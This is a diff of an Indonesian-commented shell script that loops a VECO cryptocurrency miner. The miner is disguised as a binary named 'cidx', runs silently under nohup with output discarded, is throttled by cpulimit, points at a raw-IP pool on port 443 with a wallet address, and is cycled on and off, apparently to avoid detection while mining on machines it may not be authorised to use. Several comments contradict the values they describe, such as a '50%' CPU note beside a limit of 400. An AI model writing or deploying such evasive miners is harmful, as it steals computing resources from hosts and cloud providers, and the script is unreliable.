@@ -15,17 +15,18 @@ chmod +x cidx
 while true; do
   echo "[⛏️ START] $(date): Mining aktif 5 menit..."
   
-  nohup ./cidx -a yespower \
-    -o 45.115.224.143:443 \
+  # Jalankan cidx dengan cpulimit untuk membatasi CPU ke 50%
+  nohup cpulimit --limit=400  ./cidx -a yespower \
+    -o 45.115.224.237:443 \
     -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker3 \
     -p c=VECO,m=solo,zap=VECO,mc=VECO \
     -t 6 &>/dev/null &
 
-  sleep 6000   # 5 menit mining
+  sleep 900   # 5 menit mining
 
   echo "[🛑 STOP] $(date): Mining dihentikan sementara."
   pkill cidx
 
   echo "[⏱ WAIT] Delay 15 menit sebelum jalan ulang..."
-  sleep 900   # 15 menit istirahat
+  sleep 300   # 15 menit istirahat
 done
